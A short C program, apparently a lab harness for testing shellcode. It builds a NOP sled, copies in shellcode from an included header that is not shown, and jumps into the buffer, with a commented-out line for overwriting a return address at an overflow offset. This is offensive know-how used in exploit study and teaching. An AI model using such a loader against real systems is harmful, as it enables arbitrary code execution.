#include "../shellcode.h"
#include <string.h>

#define SHELLCODE_SIZE 128
#define NOP_OPCODE 0x90
#define NOP_PREFIX 16
#define BUFFER_OVERFLOW_OFFSET 0x88

int main() {
  char buffer[SHELLCODE_SIZE];
  memset(buffer, NOP_OPCODE, SHELLCODE_SIZE);
  memcpy((char *)(buffer + NOP_PREFIX), shellcode, sizeof(shellcode) - 1);
  // *(void **)(buffer + BUFFER_OVERFLOW_OFFSET) = (void *)&buffer;
  (*(void (*)())buffer)();
}
